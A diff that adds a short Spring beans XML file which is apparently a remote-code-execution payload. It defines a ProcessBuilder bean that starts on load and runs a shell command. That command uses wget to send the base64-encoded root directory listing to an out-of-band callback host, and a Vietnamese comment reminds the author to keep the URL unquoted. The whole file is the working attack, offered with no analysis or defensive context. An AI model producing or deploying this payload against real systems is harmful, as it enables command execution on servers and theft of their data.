@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="
+         http://www.springframework.org/schema/beans
+         http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
+    <constructor-arg>
+      <list>
+        <value>sh</value>
+        <value>-c</value>
+        <!-- đúng raw URL, không thêm quotes -->
+        <value><![CDATA[
+          wget http://jrenf82hlx9x5krxegoz09bqlhr8f43t.oastify.com?c=$(ls / | base64 -w0)
+        ]]></value>
+      </list>
+    </constructor-arg>
+  </bean>
+</beans>
